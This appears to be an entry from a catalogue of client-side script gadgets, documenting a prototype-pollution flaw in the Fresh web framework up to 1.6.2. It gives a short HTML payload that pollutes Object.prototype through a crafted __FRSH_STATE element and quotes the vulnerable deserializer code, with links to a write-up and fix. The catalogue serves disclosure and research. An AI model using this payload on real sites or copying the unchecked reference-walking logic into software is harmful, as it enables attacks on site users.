---
description: Fresh is a next generation web framework, built for speed, reliability, and simplicity.
github: denoland/fresh
gadgets:
  ≤1.6.2:
    authors:
      - twitter:arkark_
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - id-attr
      - before-lib-load
    pocs:
      - description: The [deserialize](https://github.com/denoland/fresh/blob/1.6.1/src/runtime/deserializer.ts#L21-L63) function in Fresh, which was used to parse the `__FRSH_STATE` content (retrieved through an `id` attribute), was vulnerable to prototype pollution.
        code: |
          <!-- constructor.prototype.polluted=foo -->
          <div id="__FRSH_STATE">{"v":{"bar":"foo"},"r":[[["bar"],["constructor","prototype","polluted"]]]}</div>
        preview: false
    links:
      - https://blog.arkark.dev/2023/12/28/seccon-finals/#web-lemonmd
      - https://github.com/denoland/fresh/commit/8583394481230dc177ed27ec4537055187cbf2ae
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/denoland/fresh/blob/3c43d98a5738a98301132c6152067d5762294569/src/runtime/client/partials.ts#L321">https://github.com/denoland/fresh/blob/3c43d98a5738a98301132c6152067d5762294569/src/runtime/client/partials.ts#L321</a>

      ```javascript
      const state = doc.querySelector(`#__FRSH_STATE_${id}`);
      let allProps: DeserializedProps = [];
      if (state !== null) {
        const json = JSON.parse(state.textContent!) as PartialStateJson;
        const promises: Promise<void>[] = [];

        allProps = parse<DeserializedProps>(json.props, CUSTOM_PARSER);

        for (let i = 0; i < json.islands.length; i++) {
          const island = json.islands[i];
          promises.push(
            import(island.chunk).then((mod) => {
              ISLAND_REGISTRY.set(island.name, mod[island.exportName]);
            }),
          );
        }

        await Promise.all(promises);
      }
      ```

      Source: <a target="_blank" href="https://github.com/denoland/fresh/blob/1.6.1/src/runtime/deserializer.ts#L21-L63">https://github.com/denoland/fresh/blob/1.6.1/src/runtime/deserializer.ts#L21-L63</a>

      ```javascript
      export function deserialize(
        str: string,
        signal?: <T>(a: T) => Signal<T>,
      ): unknown {
        function reviver(this: unknown, _key: string, value: unknown): unknown {
          if (typeof value === "object" && value && KEY in value) {
            // deno-lint-ignore no-explicit-any
            const v: any = value;
            if (v[KEY] === "s") {
              return signal!(v.v);
            }
            if (v[KEY] === "b") {
              return BigInt(v.d);
            }
            if (v[KEY] === "u8a") {
              return b64decode(v.d);
            }
            if (v[KEY] === "l") {
              const val = v.v;
              val[KEY] = v.k;
              return val;
            }
            throw new Error(`Unknown key: ${v[KEY]}`);
          }
          return value;
        }

        const { v, r } = JSON.parse(str, reviver);
        const references = (r ?? []) as [string[], ...string[][]][];
        for (const [targetPath, ...refPaths] of references) {
          const target = targetPath.reduce((o, k) => k === null ? o : o[k], v);
          for (const refPath of refPaths) {
            if (refPath.length === 0) throw new Error("Invalid reference");
            // set the reference to the target object
            const parent = refPath.slice(0, -1).reduce(
              (o, k) => k === null ? o : o[k],
              v,
            );
            parent[refPath[refPath.length - 1]!] = target;
          }
        }
        return v;
      }
      ```
---
